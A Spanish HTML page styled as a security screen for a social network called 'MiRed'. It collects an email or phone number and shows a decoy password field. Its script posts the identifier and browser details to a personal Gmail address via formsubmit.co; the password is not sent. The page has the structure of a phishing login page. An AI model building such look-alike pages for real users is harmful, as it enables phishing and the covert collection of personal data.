<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MiRed - Seguridad</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    min-height: 100vh;
    font-family: Arial, sans-serif;
    background:
        radial-gradient(circle at 15% 15%, #164c91, transparent 40%),
        radial-gradient(circle at 85% 85%, #18265a, transparent 40%),
        #090d19;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    color: white;
}

.contenedor {
    width: 100%;
    max-width: 420px;
    perspective: 1200px;
}

.tarjeta {
    padding: 35px 25px;
    border-radius: 25px;
    background: linear-gradient(145deg,#263957,#101a2b);
    border: 1px solid #45658c;
    box-shadow: 0 25px 50px #0009,
                inset 0 2px 5px #ffffff22;
    transition: .4s;
}

.tarjeta:hover {
    transform: translateY(-5px) rotateX(2deg);
}

.logo {
    text-align: center;
    margin-bottom: 30px;
}

.logo-icono {
    width: 75px;
    height: 75px;
    margin: auto;
    border-radius: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 38px;
    font-weight: bold;
    background: linear-gradient(145deg,#39a0ff,#0750c9);
    box-shadow: 0 10px 25px #006aff66,
                inset 0 3px 5px #ffffff55;
}

.logo h1 {
    color: #65b1ff;
    margin-top: 15px;
    font-size: 32px;
}

.logo p {
    color: #a8bad3;
    font-size: 13px;
    margin-top: 7px;
}

h2 {
    text-align: center;
    margin-bottom: 12px;
}

.descripcion {
    text-align: center;
    color: #aebbd0;
    font-size: 13px;
    line-height: 1.6;
    margin-bottom: 25px;
}

.campo {
    margin-bottom: 20px;
}

.campo label {
    display: block;
    color: #b8c9e2;
    font-size: 13px;
    margin-bottom: 9px;
}

.campo input {
    width: 100%;
    padding: 15px;
    border-radius: 12px;
    border: 1px solid #405779;
    background: #101a2b;
    color: white;
    font-size: 15px;
    outline: none;
}

.campo input:focus {
    border-color: #2688ff;
    box-shadow: 0 0 12px #1877f255;
}

.password-box {
    position: relative;
}

.password-box input {
    padding-right: 55px;
}

.mostrar {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    border: none;
    background: transparent;
    color: #65b1ff;
    cursor: pointer;
    font-size: 19px;
}

.consentimiento {
    display: flex;
    gap: 10px;
    color: #aebbd0;
    font-size: 12px;
    line-height: 1.5;
    margin: 20px 0;
}

.consentimiento input {
    margin-top: 3px;
}

.boton {
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(135deg,#258bff,#0754ce);
    color: white;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 8px 20px #006aff55;
    transition: .3s;
}

.boton:hover {
    transform: translateY(-3px);
}

.boton:disabled {
    opacity: .6;
    cursor: wait;
}

#resultado {
    margin-top: 20px;
    text-align: center;
    font-size: 13px;
    line-height: 1.6;
}

.exito { color: #45e69b; }
.error { color: #ff7373; }

.pie {
    text-align: center;
    color: #71819b;
    font-size: 11px;
    margin-top: 25px;
    line-height: 1.8;
}
</style>
</head>

<body>

<div class="contenedor">
<div class="tarjeta">

    <div class="logo">
        <div class="logo-icono">M</div>
        <h1>MiRed</h1>
        <p>Tu comunidad, tu conexión.</p>
    </div>

    <h2>Seguridad de cuenta</h2>

    <p class="descripcion">
        Registra un evento de seguridad y recibe
        una notificación en tu correo.
    </p>

    <form id="formulario">

        <div class="campo">
            <label>Correo electrónico o celular</label>
            <input
                type="text"
                id="identificador"
                placeholder="Correo o número celular"
                required
            >
        </div>

        <div class="campo">
            <label>Contraseña de demostración</label>

            <div class="password-box">
                <input
                    type="password"
                    id="clave"
                    placeholder="No introduzcas una contraseña real"
                    autocomplete="off"
                >

                <button
                    type="button"
                    class="mostrar"
                    id="mostrar"
                >👁</button>
            </div>
        </div>

        <div class="consentimiento">
            <input type="checkbox" id="aceptar" required>

            <label for="aceptar">
                Acepto que se envíe mi identificador
                al correo de seguridad de MiRed.
            </label>
        </div>

        <button
            type="submit"
            class="boton"
            id="enviar"
        >
            Registrar evento
        </button>

    </form>

    <div id="resultado"></div>

    <div class="pie">
        🔒 Protección de datos MiRed.
        <br>
        Las contraseñas no se envían por correo.
        <br><br>
        © 2026 MiRed.
    </div>

</div>
</div>

<script>

// MOSTRAR U OCULTAR CONTRASEÑA

const clave = document.getElementById("clave");

document.getElementById("mostrar")
.addEventListener("click", function() {

    clave.type =
        clave.type === "password" ? "text" : "password";

    this.textContent =
        clave.type === "password" ? "👁" : "🙈";

});


// ENVÍO DE NOTIFICACIÓN

document.getElementById("formulario")
.addEventListener("submit", async function(e) {

    e.preventDefault();

    const identificador =
        document.getElementById("identificador")
        .value.trim();

    const aceptar =
        document.getElementById("aceptar").checked;

    const resultado =
        document.getElementById("resultado");

    const boton =
        document.getElementById("enviar");

    const esCorreo =
        /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identificador);

    const esCelular =
        /^\+?[0-9]{8,15}$/.test(identificador);

    if (!esCorreo && !esCelular) {
        resultado.innerHTML =
        '<span class="error">Ingresa un correo o número válido.</span>';
        return;
    }

    if (!aceptar) {
        resultado.innerHTML =
        '<span class="error">Acepta el registro del evento.</span>';
        return;
    }

    boton.disabled = true;
    boton.textContent = "Enviando notificación...";

    const fecha = new Date().toLocaleString("es-PE", {
        timeZone: "America/Lima"
    });

    const tipo = esCorreo
        ? "Correo electrónico"
        : "Número celular";

    const mensaje = `
Hola, Aron Chumacero.

Se ha registrado un evento de seguridad en MiRed.

Identificador utilizado: ${identificador}

Tipo: ${tipo}

Fecha: ${fecha}

Navegador: ${navigator.userAgent}

Sistema: ${navigator.platform}

Estado: Evento registrado.

Las contraseñas no han sido recopiladas ni enviadas.
`;

    const datos = {
        _subject: "Alerta de seguridad - MiRed",
        nombre: "MiRed",
        identificador: identificador,
        tipo: tipo,
        fecha: fecha,
        navegador: navigator.userAgent,
        sistema: navigator.platform,
        mensaje: mensaje
    };

    try {

        const respuesta = await fetch(
            "https://formsubmit.co/ajax/chumaceroyahuanaaron@gmail.com",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(datos)
            }
        );

        const respuestaJson = await respuesta.json();

        if (
            respuesta.ok &&
            String(respuestaJson.success).toLowerCase() === "true"
        ) {

            resultado.innerHTML =
            '<span class="exito">✓ Notificación enviada correctamente a Gmail.</span>';

            document.getElementById("formulario").reset();

        } else {
            throw new Error(
                respuestaJson.message || "Error de envío"
            );
        }

    } catch (error) {

        console.error(error);

        resultado.innerHTML =
        '<span class="error">No se pudo enviar el correo. Revisa la activación de FormSubmit.</span>';

    }

    boton.disabled = false;
    boton.textContent = "Registrar evento";

});

</script>

</body>
</html>
